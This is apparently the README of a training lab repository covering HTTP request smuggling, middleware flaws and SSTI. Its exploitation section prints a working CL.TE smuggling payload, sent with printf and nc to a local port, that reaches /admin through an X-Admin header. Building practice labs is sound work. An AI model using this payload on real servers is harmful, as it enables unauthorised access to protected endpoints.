# 🧪 Z-Vuln-Lab — Vulnerability Practice Labs

Z-Vuln-Lab is a hands-on web security lab series designed to help learners practice real-world vulnerabilities such as authentication bypass, SSTI, privilege escalation, and middleware flaws. Each vulnerability is isolated into its own Git branch.



---

## 📁 Project Structure

- **HTTP Request Smuggling**  
  Branch: `http-smuggling-v5`  
  https://github.com/Zwique/Z_Vuln_Lab/tree/http-smuggling-v5

- A frontend server parses requests using **Content-Length**, and
- A backend server parses requests using **Transfer-Encoding: chunked**,

- **Middleware Vulnerabilities**  
  Branch: `middleware-v2`  
  https://github.com/Zwique/Z_Vuln_Lab/tree/middleware-v2

- **Server-Side Template Injection (SSTI)**  
  Branch: `ssti-v1`  
  https://github.com/Zwique/Z_Vuln_Lab/tree/ssti-v1

---

## 🎯 Objective

GET /admin

- **v2.0-middleware**  
  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v2.0-middleware

- **v1.0-ssti**  
  https://github.com/Zwique/Z_Vuln_Lab/releases/tag/v1.0-ssti
---
```
GET /admin HTTP/1.1
Host: test
X-Admin: true
```

# 💥 Exploitation

```
printf 'POST /submit HTTP/1.1\r\nHost: test\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: test\r\nX-Admin: true\r\n\r\n' | nc 127.0.0.1 8000

python3 exp.py
```
